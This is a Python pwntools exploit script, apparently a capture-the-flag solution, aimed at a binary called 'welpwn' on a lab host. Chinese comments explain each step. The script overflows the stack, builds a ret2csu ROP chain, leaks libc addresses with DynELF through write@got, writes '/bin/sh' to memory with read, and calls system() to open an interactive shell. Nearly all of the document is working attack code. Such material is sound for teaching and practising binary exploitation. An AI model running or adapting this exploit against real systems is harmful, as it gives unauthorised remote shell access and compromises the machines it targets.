#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("172.17.0.3", 10001)
elf = ELF("welpwn")

read_got = elf.got["read"]
write_got = elf.got["write"]
start_addr = 0x400630
pop6_addr = 0x40089a		#万能gadget1：pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn
mov_call_addr = 0x400880	#万能gadget2：mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
pop4_addr = 0x40089c		#用来跳过垃圾数据
binsh_addr = 0x6010d0		#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃，所以找了个固定的可写地址
pop_rdi = 0x4008a3

def leak(addr):
	io.recv(timeout = 0.1)		#读走之前的数据，防止待泄露的数据被污染
	payload = 'A'*24			#padding
	payload += p64(pop4_addr)	#前32字节数据会被echo函数拼接到payload所在的栈空间上方，造成栈溢出，使用四个pop来清除掉这些数据，调用万能gadgets
	payload += p64(pop6_addr)	#万能gadget1，配合万能gadget2调用write
	payload += p64(0)			#rbx = 0
	payload += p64(1)			#rbp = 1，过掉后面万能gadget2的call返回后的判断
	payload += p64(write_got)	#got表中write函数项，里面是write函数的真正地址，直接通过万能gadget2的call qword ptr [r12+rbx*8]调用
	payload += p64(8)			#r13 = 8，write函数输出的字节数，万能gadget2赋值给rdx
	payload += p64(addr)		#r14 = addr, 要泄露的地址，万能gadget2赋值给rsi
	payload += p64(1)			#r15 = 1, write函数的参数fd，即STDOUT，万能gadget2赋值给edi
	payload += p64(mov_call_addr)	#调用万能gadget2
	payload += "A"*56			#万能gadget2后接判断语句，过掉之后是万能gadget1，用于填充栈
	payload += p64(start_addr)	#跳转到start，恢复栈
	payload = payload.ljust(1024, "B")	#padding
	io.send(payload)
	content = io.recv(4)
	io.recv(timeout = 0.1)
	print "%#x => %s" % (addr, (content or '').encode('hex'))
	return content

d = DynELF(leak, elf = elf)
system_addr = d.lookup("system", "libc")
log.info("system_addr = %#x", system_addr)

payload = 'A'*24								#padding
payload += p64(pop4_addr)                       #前32字节数据会被echo函数拼接到payload所在的栈空间上方，造成栈溢出，使用四个pop来清除掉这些数据，调用万能gadgets
payload += p64(pop6_addr)                       #万能gadget1
payload += p64(0)                               #rbx = 0
payload += p64(1)                               #rbp = 1，过掉后面万能gadget2的call返回后的判断[r12+rbx*8]调用
payload += p64(read_got)                        #r12 = got表中read函数项，里面是read函数的真正地址，直接通过万能gadget2的call qword ptr
payload += p64(8)                               #r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx
payload += p64(binsh_addr)                      #r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi
payload += p64(0)                               #r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi
payload += p64(mov_call_addr)                  	#万能gadget2
payload += "A"*56                               #万能gadget2后接判断语句，过掉之后是万能gadget1，用于填充栈
payload += p64(pop_rdi)                         #pop rdi; ret给system函数赋值
payload += p64(binsh_addr)						#rdi = &("/bin/sh")
payload += p64(system_addr)						#调用system("/bin/sh")
payload = payload.ljust(1024, "B")				#padding

io.recv(timeout = 0.1)
io.send(payload)
sleep(0.1)										#等待payload代码执行到调用read()
io.send("/bin/sh\x00")							#把字符串"/bin/sh\x00"写入到指定地址中
io.interactive()